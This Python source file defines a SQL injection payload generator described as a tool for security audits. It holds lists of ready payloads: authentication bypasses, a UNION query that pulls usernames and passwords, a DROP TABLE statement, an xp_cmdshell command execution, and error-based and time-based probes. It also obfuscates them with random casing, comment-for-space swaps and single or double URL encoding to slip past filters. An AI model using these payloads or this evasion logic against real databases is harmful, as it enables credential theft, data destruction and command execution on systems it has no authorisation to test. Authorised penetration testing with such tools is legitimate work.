import random
import urllib.parse

class PayloadService:
    """Service to compile and mutate SQL Injection payloads for security audits."""

    BASIC_PAYLOADS = [
        "1' OR '1'='1",
        "admin' --",
        "' OR 1=1 --",
        "1' OR 1=1 LIMIT 1#",
        "' OR 'a'='a",
        "admin' OR 1=1#"
    ]

    ADVANCED_PAYLOADS = [
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE audits; --",
        "1' AND sleep(5)#",
        "'; EXEC xp_cmdshell('dir');--",
        "1 AND (SELECT 2215 FROM(SELECT COUNT(*),CONCAT(0x7170,(SELECT (ELT(2215=2215,1))),0x7178,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
        "1' AND 1=2 UNION SELECT NULL, version() --"
    ]

    @classmethod
    def generate_payload(cls, payload_type, difficulty, mutation_level):
        """
        Generates and mutates a payload string.
        """
        # Select target base
        if payload_type == 'basic':
            pool = cls.BASIC_PAYLOADS
        elif payload_type == 'advanced':
            pool = cls.ADVANCED_PAYLOADS
        else:
            pool = cls.BASIC_PAYLOADS + cls.ADVANCED_PAYLOADS

        payload = random.choice(pool)

        # Mutate based on level (0 - 4)
        mutation_level = int(mutation_level)
        
        # Level 1: Random Character Casing
        if mutation_level >= 1:
            payload = "".join(
                char.upper() if random.random() > 0.5 else char.lower()
                for char in payload
            )

        # Level 2: Space to Comment Obfuscation (replace ' ' with '/**/')
        if mutation_level >= 2:
            payload = payload.replace(" ", "/**/")

        # Level 3: URL Encoding
        if mutation_level >= 3:
            payload = urllib.parse.quote(payload)

        # Level 4: Double URL Encoding
        if mutation_level >= 4:
            payload = urllib.parse.quote(payload)

        return payload
